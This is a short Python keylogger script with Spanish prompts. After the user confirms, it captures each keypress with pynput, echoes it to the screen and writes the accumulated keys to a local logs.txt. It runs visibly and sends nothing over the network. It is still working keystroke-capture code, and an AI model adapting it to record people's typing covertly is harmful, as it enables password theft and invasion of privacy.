#!/usr/bin/env python 
# -*- coding: utf-8 -*-

import os, sys
import pynput
from banner.banner import *
from pynput.keyboard import Key, Listener

banner()

if input("\n\033[1;33m¿Desea comenzar a grabar el teclado?\033[0m [\033[1;32my\033[0m / \033[1;31mn\033[0m]\n\n\033[1;37m>\033[0m ").upper() != "Y":
    os.system("clear")
    goodbye()
    exit(0)


os.system("clear")
listen()

keys = []

def on_press(key):
    keys.append(key)
    print("\033[0;31mTeclada Presionada =>\033[0m ",key)
    archivo(keys)

def archivo(keys):
    with open("logs.txt", "w" if os.path.isfile("logs.txt") else "w+") as file:
        for key in keys:
            key = str(key).replace("'","")

            if key == "Key.space" or key == "Key.enter" or key == "Key.backspace":
                file.write("\n")
            elif key.find("Key") == -1:
                file.write(key)
            else:
                file.write("\n"+key)
        file.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


